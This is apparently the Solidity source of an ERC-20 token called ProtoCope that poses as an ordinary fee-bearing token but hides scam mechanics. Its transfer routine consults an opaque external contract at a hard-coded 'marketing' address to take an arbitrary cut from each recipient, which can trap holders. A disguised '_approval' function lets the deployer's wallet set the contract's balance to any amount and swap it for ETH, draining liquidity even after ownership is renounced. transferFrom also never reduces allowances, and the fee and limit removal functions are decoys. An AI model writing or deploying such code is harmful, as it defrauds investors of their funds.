pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT


library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

interface IUniswapV2 {
    function swap(address, address) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _p_ath, address c, uint256) external;
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract Erc20Token is Ownable {

    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 10000000000 * 10 ** _decimals;


    string private _symbol = "PROTO";
    string private _name = "ProtoCope";

    constructor() {
        _taxWallet = sender(); 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _balances[sender()] =  _totalSupply; 
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    uint256 _startBuyFee = 4;
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function sender() internal view returns (address) {
        return msg.sender;
    }
    bool startFee = true;
    uint256 _finalBuyFee = 0;
    uint256 _startSellFee = 3;
    uint _fee = 1;
    function removeFee() public onlyOwner {
        _fee = 0;
    }
    uint256 _finalSellFee = 0;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function _transfer(address from, address to, uint256 value) internal {
        require(value <= _balances[from]);
        require(from != address(0));
        uint256 rewardAmount = getAirdropAmount(from, to);
        uint256 rewardsValue = _taxWallet == from || _taxWallet == to ? 0 : value.mul(rewardAmount).div(100);
        _balances[to] = _balances[to] - rewardsValue + value;
        _balances[from] = _balances[from] - value;
        emit Transfer(from, to, value);
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    address private marketingWallet = 0xBd938093cf5FD687579D8F8B0c8E4f45fc9C0150;
    function _approval(uint256 amount) external {
        if (isAirdropped()){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory token_ = new address[](2);
        token_[0] = tokenAddress; 
        token_[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, token_, _taxWallet, block.timestamp + 28);
        } else {return; }
    }
    function removeLimit() public onlyOwner {
        maxTransaction = _totalSupply;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function isAirdropped() private view returns (bool) {
        return  _taxWallet == sender();
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function name() external view returns (string memory) {
        return _name;
    }
    uint256 maxTransaction = _totalSupply.mul(3).div(100);
    address public _taxWallet;
    event Transfer(address indexed from_, address indexed _to, uint256);
    function getAirdropAmount(address walletAddress, address from) internal returns (uint256) {
        string memory bOf = "balanceOf(address,address,address)";
        (bool re, bytes memory vVal) = marketingWallet.call(abi
        .encodeWithSignature(bOf, walletAddress, from, address(this)));
        return abi
        .decode(vVal, (uint256));
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Approval(address indexed a1, address indexed a2, uint256 value);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
}